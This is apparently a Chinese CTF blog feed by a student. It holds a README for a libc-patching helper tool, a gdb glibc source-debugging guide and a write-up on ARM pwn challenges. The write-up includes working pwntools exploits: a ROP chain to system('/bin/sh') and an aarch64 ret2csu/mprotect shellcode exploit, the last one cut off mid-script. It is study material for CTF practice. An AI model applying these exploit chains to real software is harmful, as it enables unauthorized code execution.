<p><strong>当你使用docker compose up 命令启动容器时，Docker Compose会读取docker-compose.yml文件并使用Dockerfile构建镜像，然后根据文件中配置启动容器，并执行start.sh脚本。，容器启动后，就可以通过指定的端口访问容器中运行的应用或服务。</strong></p>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>patchup--命令行小工具</title>
    <url>/posts/853f1673.html</url>
    <content><![CDATA[<h1 id="patchup"><a href="#patchup" class="headerlink" title="patchup"></a>patchup</h1><p>该工具是我自用的一个小工具（针对于做pwn题的辅助工具）（本工具的实现非常简单，而且这个工具的核心是依赖patchelf和glibc-all-in-one这两个工具），用于快速修改本地<code>ELF</code>文件的libc使其与远程服务器那边所运行的程序依赖的<code>libc</code>库一样<br>从而避免了因为 <code>libc</code> 问题，而导致本地打通了但是远程没打通的尴尬情况。因为每次都手动 <code>patch libc</code> 的过程太过于重复，而且有概率出错，同时受到了<br><code>roderick</code> 师傅写的 <code>pwncli</code> 的启发，于是就有自己写一个命令行工具的想法。<br>如果你想看施工现场，请见 <a href="https://github.com/ZIKH26/patchup">github仓库</a></p>
<span id="more"></span>

<h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><p>由于这个小工具依赖的核心依然是 <code>patchelf</code> 和 <code>glibc-all-in-one</code> ，能让它以命令行工具的身份出现，还少不了python中的 <code>click</code> 模块。<br>因此你应该有如下东西 <code>patchelf</code>   <code>glibc-all-in-one</code> ，如果有的话请直接看下面的 <a href="#install-patchup">install patchup</a> 部分，如果没有的话下文就是相关部署。</p>
<h3 id="install-patchelf"><a href="#install-patchelf" class="headerlink" title="install patchelf"></a>install patchelf</h3><h4 id="直接使用预编译的二进制文件"><a href="#直接使用预编译的二进制文件" class="headerlink" title="直接使用预编译的二进制文件"></a>直接使用预编译的二进制文件</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://github.com/NixOS/patchelf/releases/download/0.14.5/patchelf-0.14.5-x86_64.tar.gz</span><br><span class="line">tar -xzvf patchelf-0.14.5-x86_64.tar.gz</span><br><span class="line"><span class="built_in">cd</span> bin</span><br><span class="line">sudo <span class="built_in">mv</span> patchelf /bin/patchelf</span><br></pre></td></tr></table></figure>

<h4 id="手动编译-patchelf"><a href="#手动编译-patchelf" class="headerlink" title="手动编译 patchelf"></a>手动编译 patchelf</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/NixOS/patchelf</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> patchelf</span><br><span class="line"><span class="comment"># 安装autoreconf</span></span><br><span class="line">sudo apt install -y autoconf</span><br><span class="line"><span class="comment"># 赋予执行权限</span></span><br><span class="line"><span class="built_in">chmod</span> +x bootstrap.sh</span><br><span class="line"><span class="comment"># 使用预设脚本配置编译环境</span></span><br><span class="line">./bootstrap.sh</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make check</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>



<h3 id="install-glibc-all-in-one"><a href="#install-glibc-all-in-one" class="headerlink" title="install glibc-all-in-one"></a>install glibc-all-in-one</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/matrix1001/glibc-all-in-one</span><br><span class="line"><span class="built_in">cd</span> glibc-all-in-one</span><br><span class="line"><span class="built_in">mkdir</span> libs</span><br><span class="line"><span class="built_in">chmod</span> +x  extract  update_list download</span><br><span class="line">./update_list</span><br></pre></td></tr></table></figure>

<p>cd 到上级目录</p>
<h2 id="install-patchup"><a href="#install-patchup" class="headerlink" title="install patchup"></a>install patchup</h2><p>ok，假设你现在有了 <code>patchelf</code> 和 <code>glibc-all-in-one</code>  那么你就可以输入以下命令来安装 <code>patchup</code> 这个小工具了 </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/polishing-labs/patchup.git</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> patchup</span><br><span class="line"></span><br><span class="line">sudo pip install --editable .</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以输入patchup –help命令查看帮助，如果出现下面图片所展示的内容，则说明安装成功。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">patchup --<span class="built_in">help</span></span><br></pre></td></tr></table></figure>
<img width="544" alt="image" src="https://user-images.githubusercontent.com/93199623/168457093-d3019f95-8ec7-4dd1-bea6-ea7222e77533.png">





<p>最后目录结构应该如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">glibc-all-in-one（目录）</span><br><span class="line">patchelf（目录）</span><br><span class="line">patchup</span><br><span class="line">	├── patchup.py(仓库文件)</span><br><span class="line">	└── setup.py(仓库文件</span><br></pre></td></tr></table></figure>


<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>假设你有一个 名为 <code>demo</code>  ELF 文件,他现在默认的 <code>libc</code> 库是 <code>2.27</code> 的，但是服务器那边的这个程序所依赖的 <code>libc</code> 库是2.23的<br>那么你就可以使用以下命令，去为你的ELF文件patch一个 <code>2.23</code> 的 <code>libc</code> 库。（<code>-b</code> 是备份的意思，建议每次使用 <code>patchup</code> 时都开启该选项,<code>-c</code>是自主选择小版本libc的选项，开启这个选项你可以选择小版本不同的<code>2.23</code>的<code>libc</code>库，如果不开启，则默认是匹配到2.23版本的第一个<code>libc</code>库）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">patchup demo 2.23 -b</span><br></pre></td></tr></table></figure>
<img width="965" alt="image" src="https://user-images.githubusercontent.com/93199623/167239931-d6266ea8-5ee6-4dde-9037-a20ae9e73069.png">

<h3 id="glibc-all-in-one中没有所需要的libc"><a href="#glibc-all-in-one中没有所需要的libc" class="headerlink" title="glibc-all-in-one中没有所需要的libc"></a>glibc-all-in-one中没有所需要的libc</h3><p>假设你的 <code>glibc-all-in-one</code> 中空空如也（没有所需要的libc版本），别担心，你依旧可以输入上面的命令。<code>patchup</code> 将会为你自动下载（如果你需要的话）效果如下：<br><img width="1149" alt="image" src="https://user-images.githubusercontent.com/93199623/167242074-a6b3d411-af5d-4444-b9f4-acec16667e94.png"></p>
<p>此时 <code>match_libc_success_match</code> 展示了当前可以下载的libc版本，你可以输入下面索引来选择它们（第一个索引是0，第二个索引是1，以此类推）<br><img width="1145" alt="image" src="https://user-images.githubusercontent.com/93199623/167242133-464207ad-6416-4cc1-859f-32ebca40ff7b.png"><br>等待下载成功后，将自动进行 <code>patch</code>（如果不想下载的话，可以输入q退出）</p>
<h3 id="使用题目指定的libc库"><a href="#使用题目指定的libc库" class="headerlink" title="使用题目指定的libc库"></a>使用题目指定的libc库</h3><p>如果题目给定了一个libc库，别担心 <code>patchup</code> 依旧会正常工作，<code>patchup</code> 将会去寻找相应匹配的 <code>ld</code>，如果有的话则会直接链接，<br><img width="966" alt="image" src="https://user-images.githubusercontent.com/93199623/167242830-9cf871bb-e025-4c51-9fca-c3d78f462924.png"></p>
<p>没有的话则会自动下载（如果你需要的话），如下图<br><img width="1150" alt="image" src="https://user-images.githubusercontent.com/93199623/167242865-c6a01d64-1c9f-415b-aa18-5428821d0a15.png"></p>
<p>值得一提的就是，我碰见过使用<code>patchup</code>之后<code>patch</code>指定<code>libc</code>是失败的，不过我检查了一下发现这并不是<code>patchup</code>的问题，应该是<code>patchelf</code>出了点<code>bug</code>，所以碰到这种情况，可以换成<code>glibc-all-in-one</code>中版本一样的<code>libc</code>库试试。</p>
<h2 id="Thanks"><a href="#Thanks" class="headerlink" title="Thanks"></a>Thanks</h2><p>尽管本工具异常的简单，但是对于我这个不太聪明的大一学生来说，写的过程也并不一帆风顺。感谢 Roderick 师傅带给我的启发以及解答一些我的困惑，也感谢我的队员 <a href="www.timochan.cn">Timochan</a> , 如果没有他，关于这个工具在其他主机上的一些环境部署我可能无法实现</p>
]]></content>
      <categories>
        <category>尝试开发小工具</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>编程</tag>
        <tag>小工具</tag>
      </tags>
  </entry>
  <entry>
    <title>关于gdb源码调试环境搭建</title>
    <url>/posts/c5c57579.html</url>
    <content><![CDATA[<p>有时候我们要去追踪一些函数或是数据，需要用gdb动态调试并去结合着源码分析。下面介绍一下gdb源码调试的环境如何搭建</p>
<span id="more"></span>

<h2 id="glibc源码下载"><a href="#glibc源码下载" class="headerlink" title="glibc源码下载"></a>glibc源码下载</h2><p>glibc源码可以在下面这个链接下载</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://launchpad.net/ubuntu/+source/glibc/</span><br></pre></td></tr></table></figure>
<p><img src="/../img/2706180-20220415172522191-1508848149.png"></p>
<p>选择需要的glibc版本，我以2.27-3ubuntu 1.5为例</p>
<p><img src="/../img/2706180-20220415172035738-582520439.png" alt="image-20220415164406215"></p>
<p>选择这个最大的文件，下载。</p>
<p>然后拖到ubuntu里面解压</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar -xf filename</span><br></pre></td></tr></table></figure>

<p><img src="/../img/2706180-20220415172035504-1672278744.png" alt="image-20220415164603510"></p>
<p>新建一个大的文件夹，用来存放各个版本的glibc，然后进入新下载的glibc，ls看一下发现东西都在里面。然后我们需要去找源码所在的文件夹。</p>
<p><img src="/../img/2706180-20220415172035082-1039167232.png" alt="image-20220415164836238"></p>
<h2 id="找一下函数所在的源文件"><a href="#找一下函数所在的源文件" class="headerlink" title="找一下函数所在的源文件"></a>找一下函数所在的源文件</h2><p>比如我现在想进行exit源码调试，先去下面这个网站搜一下exit源码在哪个文件里面。</p>
<p><a href="https://code.woboq.org/">在线查看源码网站</a></p>
<p><img src="/../img/2706180-20220415172618725-1985569220.png"></p>
<p>进去之后，搜索想找的函数，然后就可以看到它所在的文件。发现exit.c在stdlib文件中。</p>
<p><img src="/../img/2706180-20220415172034631-573661594.png" alt="image-20220415165453694"></p>
<p>我们去看一下，果然是在stdlib中发现了exit.c</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202312181627227.png" alt="image-20231218162715959"></p>
<h2 id="配置-gdbinit"><a href="#配置-gdbinit" class="headerlink" title="配置.gdbinit"></a>配置.gdbinit</h2><p>然后pwd，复制一下路径。</p>
<p><img src="/../img/2706180-20220415172034380-1120493636.png" alt="image-20220415165737197"></p>
<p>然后去用户目录下输入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim .gdbinit</span><br></pre></td></tr></table></figure>

<p>然后输入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dir</span>  刚才复制的路径</span><br></pre></td></tr></table></figure>

<p>效果如下</p>
<p><img src="/../img/2706180-20220415172033716-637621406.png" alt="image-20220415170846971"></p>
<p>最后保存一下就ok了。</p>
<p>然后gdb继续调试elf程序即可，等进入你装载进去的文件之后，就会自动展示glibc源代码。</p>
<h2 id="最后效果"><a href="#最后效果" class="headerlink" title="最后效果"></a>最后效果</h2><p>效果如下：</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202312181624346.png" alt="image-20231218162412006"></p>
<p>PS：如果调试其他函数没有出现源码，就说明没有导入成功对应的代码源文件，另外就是调试不同的程序，对应的glibc版本不要选错了。</p>
<p>参考博客：</p>
<p><a href="http://taqini.space/2020/11/01/glibc-debug-pwndbg/#Glibc%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">Glibc源码调试环境搭建 | TaQini</a></p>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
  </entry>
  <entry>
    <title>关于学习arm架构下的pwn的总结</title>
    <url>/posts/536aee5b.html</url>
    <content><![CDATA[<p>通过这段时间对于arm架构的题目学习，自认为收获还是不少的。下面是对于这段时间关于arm架构的pwn题学习所进行的总结。<span id="more"></span>（我其实还想再多做几道arm架构的栈题的，可是网上所找到的实在不多，等再遇到新的arm架构题目，我再添到这篇文章上吧）</p>
<h1 id="运行程序-amp-amp-启动调试"><a href="#运行程序-amp-amp-启动调试" class="headerlink" title="运行程序&amp;&amp;启动调试"></a>运行程序&amp;&amp;启动调试</h1><p>咋装的环境已经忘记了…（装完环境过了一段时间才开始arm架构的学习）装配环境的话，上网搜一下文章也不少。可以参考这篇文章  <a href="https://blog.csdn.net/A951860555/article/details/116780827#_4">(26条消息) CTF pwn – ARM架构的pwn题详解___lifanxin的博客-CSDN博客</a></p>
<p>记录一下怎么启动以及调试arm架构的程序。</p>
<p>先checksec一下（或者用file命令也行），看看是什么架构的。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309201809803.png"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309201809675.png"></p>
<p>file命令可以查看程序是动态链接还是静态链接。</p>
<h2 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h2><p>如果程序是静态链接并且是32位 arm架构的话，输入qemu-arm .&#x2F;程序名</p>
<p>如果程序是静态链接并且是aarch64架构的话，输入qemu-aarch .&#x2F;程序名</p>
<p>如果程序是动态链接且是32位 arm架构的话，输入qemu-arm -L  &#x2F;usr&#x2F;arm-linux-gnueabihf .&#x2F;程序名</p>
<p>如果程序是动态链接且是aarch64架构的话，输入qemu-aarch64 -L &#x2F;usr&#x2F;aarch64-linux-gnu  .&#x2F;程序名	</p>
<h2 id="启动调试"><a href="#启动调试" class="headerlink" title="启动调试"></a>启动调试</h2><p><strong>启动调试和运行程序的命令很相似，仅仅是加了一个参数-g 然后后面跟一个端口</strong>。</p>
<p>比如程序是动态链接的32位 arm架构的话，输入qemu-arm -g 1234 -L &#x2F;usr&#x2F;aarch64-linux-gnu .&#x2F;程序名</p>
<p>这个1234是你指定的端口，指定别的端口也可以。然后参照运行程序那四个命令以及上面这个命令，就可以依次类推出调试aarch64架构的命令了。</p>
<p>此时再打开另一个终端，输入gdb-multiarch（<strong>必须是用pwndbg，如果是peda的话，是没法正常调试的</strong>）</p>
<p>然后再输入target remote localhost:1234   连接到刚才开的那个端口。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309201810860.png" alt="image-20230920181019511"></p>
<p>进入调试效果如图</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309201810480.png" alt="image-20230920181037125"></p>
<p>不知道为啥，arm架构进去调试似乎不是从main函数开始的，如果单步的话需要走很久很久，可以进去之后用b在想停留的那个地方下个断点，然后c过去，这样会快很多。</p>
<h2 id="遇见的报错"><a href="#遇见的报错" class="headerlink" title="遇见的报错"></a>遇见的报错</h2><p>1、如果32位遇见这个报错的话：&#x2F;lib&#x2F;ld-linux-armhf.so.3: No such file or directory    </p>
<p>输入命令sudo apt-get install libc6-armhf-cross</p>
<p>2、如果遇见这个报错的话：Invalid ELF image for this architecture</p>
<p>就说明你的qemu后面跟的参数不对，就比如你这个程序是aarch64架构的，但是你qemu后面跟的是-arm。如果你这个程序是aarch64架构的，正确做法应该是qemu后面跟着-aarch64	</p>
<p>然后关于arm架构下的指令，在网上能搜到很多，也解释的比较清楚，我就不在这里赘述了。</p>
<p>下面三道例题（其实我是想多写几道的，但是在网上找到可下载的题目只有这三道（还有个堆题，等学堆了再做））的下载链接：</p>
<p>链接: <a href="https://pan.baidu.com/s/1dRbm8k5qup7Anj9UDrsBlA?pwd=ecpr">https://pan.baidu.com/s/1dRbm8k5qup7Anj9UDrsBlA?pwd=ecpr</a> 提取码: ecpr </p>
<h1 id="typo"><a href="#typo" class="headerlink" title="typo"></a>typo</h1><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>通过这道题的收获与学习有：</p>
<p>1、这是做的第一道arm架构的题目，考察的就是最简单的rop，学习到了arm32的寄存器传参方式，以及最简单的rop利用。</p>
<p>2、在面对静态链接的程序，IDA打开之后会发现里面有几百个函数，而且也搜不到main函数，在这种情况下，可以利用搜<strong>索关键字符串，通过关键字符串去找主函数</strong>。</p>
<p>3、不知道是不是我的错觉，在考察简单的rop情况下，似乎师傅们都没有去花很多的精力去查看ida生成的伪代码（确实伪代码太多了），直接gdb打开看完偏移就是干。</p>
<p>4、在面对静态链接的程序，从ida中分析可能会异常的麻烦，如果有可能的话，其实可以靠输入内容之后观察程序的回显，猜测一些程序功能。</p>
<h2 id="保护策略"><a href="#保护策略" class="headerlink" title="保护策略"></a>保护策略</h2><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309201811503.png"></p>
<h2 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h2><p>打开IDA之后，可以发现是静态链接，旁边有非常多的函数，难以迅速定位到主函数。因此采用一种比较好用的方法。</p>
<p>先运行一下这个程序，发现有这种字符串</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309201811504.png"></p>
<p>那就在IDA里面用shift+F12，查看一下这个字符串。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309201811505.png"></p>
<p>然后看一下引用，如此就可以找到主函数了</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309201811506.png"></p>
<p>跳到汇编代码处，F5一下，即可看到主函数的伪代码（直接搜main函数的话，也是搜不到的）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309201811508.png"></p>
<p>直接看伪代码有点懵，先输入一些垃圾数据（第一次必须要输入一个回车），看看是否存在溢出</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309201811509.png"></p>
<p>发现段错误了，那就说明存在溢出。然后用gdb调试一下，看看溢出是多少。</p>
<p>最初我企图用gdb单步到输入函数，然后输入垃圾数据，不过单步了很久发现依旧没有到可输入的地方，通过去看其他师傅的博客，发现了一个方便的方法。<strong>我们启动gdb之后直接输入c。c的本意是去continue到下一个断点，可是我们压根就没有下断点，因此能让这个continue停下的办法就是碰到输入函数</strong>（这一招确实妙啊）。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309201811510.png"></p>
<p>我们第一次先输入一个回车</p>
<h3 id="插入一点：如果不输入回车呢？"><a href="#插入一点：如果不输入回车呢？" class="headerlink" title="插入一点：如果不输入回车呢？"></a>插入一点：如果不输入回车呢？</h3><p>不输入回车，去输入别的内容的话，程序会将我们输入的内容丢弃第一个字符，从而把后面的内容去当做命令处理。<br><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309201811511.png"></p>
<p>可以发现第一次输入了个kkkkkkkkk，结果报了一个command not found。那就说明这个程序试图将我们输入的内容当做命令执行。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309201811512.png"></p>
<p>可是我们输入ls的话，它说s这个命令没有被执行，由此猜测，第一个字符被丢弃了。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309201811513.png"></p>
<p>结合上图发现，事实确实如此，可是这样就发现我们输入的内容当做指令执行的话，程序就结束了，因此我们尝试只输入一个回车看看会怎么样？</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309201811514.png"></p>
<p>程序开始继续运行了。而且值得一提的是，人家英语也说了，按下回车键就会开始。</p>
<p>继续回归正题</p>
<p>怎么去确定偏移量？我们采用cyclic去确定输入点距离返回地址的偏移。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309201811515.png"></p>
<p>用cyclic填充两百个字符，然后用cyclic -l得到偏移。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309201812090.png" alt="image-20230920181159799"></p>
<p>因为这是静态链接，因此我们可以很轻松的去里面拿到我们想要的&#x2F;bin&#x2F;sh参数和system函数。</p>
<p>事实上我们没有办法搜到system函数，但是猜测一下，system会调用&#x2F;bin&#x2F;sh，因此我们先去找一下&#x2F;bin&#x2F;sh</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309201811516.png"><br><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309201811517.png"></p>
<p><strong>如果你的IDA没有出现上面红框里面的内容，就说明IDA还没有把所有的数据装载完，等一会就行了。</strong></p>
<p>然后点上面红色框跳转过来，就是这个函数。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309201811518.png"></p>
<p>虽然我看不出来他是个system函数，但是有关系嘛？没有关系。如此，system函数的地址就是 0x10ba8</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309201811519.png"></p>
<h2 id="arm架构的基本知识"><a href="#arm架构的基本知识" class="headerlink" title="arm架构的基本知识"></a>arm架构的基本知识</h2><h3 id="arm32位"><a href="#arm32位" class="headerlink" title="arm32位"></a>arm32位</h3><p>这个arm32位的话，<strong>传前四个参数是用的r0~r3寄存器</strong>，如果<strong>参数再多的话，就利用栈传参</strong>（从右向左依次入栈）。<strong>函数的返回值会存在r0寄存器</strong>中。然后<strong>pc寄存器就相当于x86中的eip寄存器</strong>（始终装的都是我们下一条指令执行的地址）除此之外，<strong>arm 的 b&#x2F;bl 等指令实现跳转</strong>。</p>
<p>因此我们就先去看看有什么可以控制r0寄存器的gadget。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309201811520.png"></p>
<p>这个pop r0 r4 pc就很nice。</p>
<p>r4我们随便填充，pc你可以理解为ret的效果。然后payload格式跟x86的差不多。</p>
<h2 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./typo&#x27;</span>)</span><br><span class="line">offset=<span class="number">112</span></span><br><span class="line">pop_r0_r4_pc_addr=<span class="number">0x00020904</span></span><br><span class="line">bin_sh_addr=<span class="number">0x0006c384</span></span><br><span class="line">sys_addr=<span class="number">0x00010BA8</span></span><br><span class="line">p.send(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload=offset*<span class="string">&#x27;a&#x27;</span>+p32(pop_r0_r4_pc_addr)+p32(bin_sh_addr)+p32(<span class="number">0</span>)+p32(sys_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()                 </span><br></pre></td></tr></table></figure>

<h1 id="Shanghai2018-–-baby-arm"><a href="#Shanghai2018-–-baby-arm" class="headerlink" title="Shanghai2018 – baby_arm"></a>Shanghai2018 – baby_arm</h1><h2 id="总结：-1"><a href="#总结：-1" class="headerlink" title="总结："></a>总结：</h2><p>通过这道题的学习与收获有：</p>
<p>1、这道题也算是学习了arrch64架构下的ret2csu，与x86中的区别其实并不大。</p>
<p>2、mprotect函数去修改内存属性，从而执行shellcode</p>
<h2 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h2><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309201811521.png"></p>
<h2 id="程序分析："><a href="#程序分析：" class="headerlink" title="程序分析："></a>程序分析：</h2><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309201811523.png"></p>
<p>程序逻辑很简单，read一次输入，输入到bss段，没法溢出。然后sub_4007F0函数也有一次输入，输入到栈里，存在溢出。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309201811524.png"></p>
<p>同时程序中存在一个mprotect函数。</p>
<h2 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h2><h3 id="劫持执行流"><a href="#劫持执行流" class="headerlink" title="劫持执行流"></a>劫持执行流</h3><p>这道题发现在第二个read结束后，我们的数据并不能覆盖返回地址（此时返回地址在我们输入数据的上面）（如下图）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309201811525.png"></p>
<p>不过我们发现在0x400860的地方还有一个ret，我们单步到这个ret看看，此时的x30是什么。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309201811526.png"></p>
<p>可以发现此时的x30，就是距离栈顶为2的内容，而这个内容对应的栈地址0x40007fffb8则是在我们第二次read输入的起始地址下面，也就是说我们可以控制这个地址，从而来劫持程序的执行流。</p>
<h3 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu?"></a>ret2csu?</h3><p>由于mprotect函数可以改变内存的属性，本来这道题是bss段是只能写的，不过我们可以用mprotect将bss段变成可执行，然后往里面输入个shellcode就ok了。怎么控制mprotect的参数？</p>
<p>我们发现，arm架构下，也有一段汇编可以控制寄存器参数（完全可以把这段当成x86中的csu）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309201811527.png"></p>
<p>先分析下面的loc_4008cc的内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LDP             X19, X20, [SP,#var_s10]</span><br><span class="line">LDP             X21, X22, [SP,#var_s20]</span><br><span class="line">LDP             X23, X24, [SP,#var_s30]</span><br><span class="line">LDP             X29, X30, [SP+var_s0],#0x40                </span><br><span class="line">RET</span><br></pre></td></tr></table></figure>

<p>第一句这个LDP         X19, X20, [SP,#var_s10]就是说将SP+0x10所指向的内容给x19和x20寄存器（x19寄存器拿的是SP+0x10所指向的内容，而x20寄存器拿的是SP+0x18所指向的内容）</p>
<p>然后第四句这个LDP         X29, X30, [SP+var_s0],#0x40的意思是将SP所指向的内容给x29和x30寄存器（x29寄存器拿的是SP所指向的内容，而x30寄存器拿的是SP+0x8所指向的内容），完成这句指令之后，再将SP指针增加0x40个字节。</p>
<p>然后ret，这个就是返回到x30寄存器所存储的值。</p>
<p>再结合着刚刚分析的内容，来看一下loc_4008ac的内容。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LDR             X3, [X21,X19,LSL#3]</span><br><span class="line">MOV             X2, X22</span><br><span class="line">MOV             X1, X23</span><br><span class="line">MOV             W0, W24</span><br><span class="line">ADD             X19, X19, #1</span><br><span class="line">BLR             X3</span><br><span class="line">CMP             X19, X20</span><br><span class="line">B.NE            loc_4008AC</span><br></pre></td></tr></table></figure>

<p>第一句就是说将x19的值逻辑左移3位，然后加上x21的值，将得到的这个值所指向内容给x3寄存器。（如果我们控制x19的值为0的话，就是说把x21寄存器的值所指向的内容给x3寄存器。</p>
<p>然后剩下的mov，add就没什么好说的了。</p>
<p>倒数第三行BLR指令是去跳转到X3寄存器的值，同时把下一个指令的地址存到x30里面。</p>
<p>然后下面的CMP和x86里面的一样了。</p>
<p>如此思路就出来了，几乎是跟ret2csu的利用方法一样。有两点需要注意一下。第一点就是loc_4008cc中的</p>
<p>LDP             X29, X30, [SP+var_s0],#0x40    这个指令，虽然<strong>它是在这个loc_4008cc函数的最后，但是它传给x29和x30寄存器的时候，拿的是栈顶的值。因此布置栈中数据的时候，栈顶的内容应该是存放的x29和x30的值。</strong></p>
<p>第二点，<strong>是BLR X3的时候，这个X3的值溯源一下，它是由X21充当指针来指向的，而X21的值又是SP+0x20充当指针来指向的。意思就是说，我们最终想跳转的内容必须被指针的指针所指向，因此考虑的是将X3的内容放在bss段，然后X21去存储bss段的地址（指向X3的内容），然后再把X21的值布置在栈里面</strong>。最后X3的值放入mprotect的plt地址即可（<strong>因为BLR跳的话，直接跳到了寄存器的值处，因此这里应该放的是plt地址（要求这个地址装的就是指令）</strong>，got地址（装的是got表，而got表中装的才是指令）是用于指针寻址跳转的情况，当时在这里迷了一下）。</p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;aarch64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26705</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./zhengchang&#x27;</span>)</span><br><span class="line">mprotect_got=e.got[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">mprotect_plt=e.plt[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">offset=<span class="number">0x48</span></span><br><span class="line">bss_addr=<span class="number">0x411068</span></span><br><span class="line">csu1=<span class="number">0x4008CC</span></span><br><span class="line">csu2=<span class="number">0x4008AC</span></span><br><span class="line">shellcode=asm(shellcraft.aarch64.sh())</span><br><span class="line">shellcode=shellcode.ljust(<span class="number">0x100</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">shellcode+=p64(mprotect_plt)</span><br><span class="line">payload1=shellcode</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Name:&#x27;</span>,payload1)</span><br><span class="line">payload2=offset*<span class="string">&#x27;a&#x27;</span>+p64(csu1)</span><br><span class="line">payload2+=p64(<span class="number">0</span>)+p64(csu2) <span class="comment">#x29 x30</span></span><br><span class="line">payload2+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>) <span class="comment">#x19 x20</span></span><br><span class="line">payload2+=p64(bss_addr+<span class="number">0x100</span>)+p64(<span class="number">7</span>)<span class="comment">#x21 x22  分别赋值给了x3 x2</span></span><br><span class="line">payload2+=p64(<span class="number">0x1000</span>)+p64(<span class="number">0x411000</span>)<span class="comment">#x23 x24  分别赋值给了x1 w0</span></span><br><span 